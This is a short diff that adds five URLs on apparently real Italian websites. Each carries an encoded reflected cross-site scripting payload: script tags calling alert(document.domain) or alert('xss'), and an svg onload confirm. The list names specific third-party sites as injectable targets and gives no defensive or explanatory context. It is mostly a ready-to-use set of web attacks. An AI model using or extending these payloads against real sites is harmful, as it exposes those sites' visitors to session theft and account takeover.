@@ -1,0 +1,5 @@
+http://albertoguerra.it/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://arwio.it/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://asmecal.it/printenv.shtml?%3Cscript%3Ealert(%27xss%27)%3C/script%3E
+http://asusroma.it/weibo/topic/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+https://asem.it/?key=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss%27%29%3E
